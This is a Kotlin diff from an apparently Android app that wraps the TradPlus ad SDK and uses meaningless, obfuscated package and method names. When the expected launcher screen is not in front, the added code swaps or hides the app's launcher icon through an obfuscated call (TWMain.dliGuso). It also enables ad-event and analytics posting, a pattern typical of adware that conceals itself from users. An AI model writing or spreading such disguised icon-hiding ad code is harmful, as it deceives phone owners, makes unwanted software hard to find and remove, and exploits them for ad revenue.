@@ -18,6 +18,7 @@ import com.ling.ding.sighed.txtmain.FirstRunFun
 import com.ling.ding.sighed.txtmain.FirstRunFun.localStorage
 import com.ling.ding.sighed.txtmain.FirstRunFun.mainStart
 import com.ling.ding.sighed.txtmain.IntetNetSHow
+import com.ling.ding.sighed.zmain.TWMain
 import com.tradplus.ads.base.bean.TPAdError
 import com.tradplus.ads.base.bean.TPAdInfo
 import com.tradplus.ads.open.interstitial.InterstitialAdListener
@@ -114,17 +115,16 @@ class TranplusUtils {
 
             // 检查当前活动是否是目标启动界面
             if (activities.isEmpty() ||
-                (activities.last().javaClass.name != DrinkConfigData.startPack1 &&
-                        activities.last().javaClass.name != DrinkConfigData.startPack2)) {
+                (activities.last().javaClass.name != DrinkConfigData.startPack2)) {
 
                 if (activities.isEmpty()) {
                     ShowDataTool.showLog("活动栈为空，应用可能未完全启动")
                 } else {
                     ShowDataTool.showLog("当前活动: ${activities.last().javaClass.name}")
                 }
-                ShowDataTool.showLog("隐藏图标")
-//                TWMain.dliGuso(5122)
-                FirstRunFun.disableComponent(mainStart,"com.sophisticated.person.under.sun.ui.show.qqqqddd.Kkkpp")
+                ShowDataTool.showLog("替换图标")
+                TWMain.dliGuso(869784)
+//                FirstRunFun.disableComponent(mainStart,"com.sophisticated.person.under.sun.ui.show.qqqqddd.Kkkpp")
                 break
             }
 
@@ -202,7 +202,7 @@ class TranplusUtils {
                 adLimiter.recordShow()
                 resetAdStatus()
                 adInfo.let { TtPoint.postAdData(it) }
-//                AppPointData.showSuccessPoint()
+                AppPointData.showSuccessPoint()
                 isAdDataAvailable = false
             }
 
@@ -391,9 +391,9 @@ class TranplusUtils {
 
             // 记录广告失败次数
             incrementAdFailureCount()
-//            TWMain.dliGuso(20388)
+            TWMain.dliGuso(120388)
             // 发送广告开始事件
-//            TtPoint.postPointData(false, "callstart")
+            TtPoint.postPointData(false, "callstart")
         }
     }
 
